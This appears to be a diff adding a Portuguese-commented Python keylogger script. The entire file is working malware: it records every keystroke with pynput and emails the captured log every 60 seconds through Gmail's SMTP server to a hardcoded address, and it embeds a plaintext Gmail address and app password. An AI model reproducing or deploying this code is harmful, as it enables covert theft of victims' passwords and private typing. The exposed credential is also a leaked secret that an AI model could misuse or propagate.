@@ -1,0 +1,73 @@
+Script da execução do keylogger:
+
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+import os
+
+# ===================== CONFIGURAÇÕES =====================
+EMAIL_ORIGEM = "souoquevimpraser@gmail.com"
+EMAIL_DESTINO = "souoquevimpraser@gmail.com"
+SENHA_EMAIL = "fwgv nvby xysh otzi"  # Use app password do Gmail!
+
+log = ""
+
+# ===================== TIMER RECURSIVO =====================
+class RepeatTimer(Timer):
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
+
+def enviar_email():
+    global log
+    if log.strip():
+        msg = MIMEText(log)
+        msg['Subject'] = "Keylogger - Dados Capturados"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.sendmail(EMAIL_ORIGEM, EMAIL_DESTINO, msg.as_string())
+            server.quit()
+            print(f"[+] E-mail enviado! ({len(log)} caracteres)")
+            log = ""  # Limpa após envio
+        except Exception as e:
+            print(f"[-] Erro ao enviar e-mail: {e}")
+
+# Inicia envio a cada 60 segundos
+timer = RepeatTimer(60, enviar_email)
+timer.start()
+
+# ===================== KEYLOGGER =====================
+def on_press(key):
+    global log
+    try:
+        # Teclas normais
+        log += key.char
+    except AttributeError:
+        # Teclas especiais
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.tab:
+            log += "\t"
+        elif key == keyboard.Key.backspace:
+            log += "[BACKSPACE]"
+        elif key == keyboard.Key.esc:
+            return False  # Para o listener
+        else:
+            log += f"[{key.name.upper()}]"
+
+print("Keylogger iniciado... Pressione ESC para parar.")
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+# Para o timer ao encerrar
+timer.cancel()
+enviar_email()  # Envia o que sobrou
+print("Keylogger encerrado.")
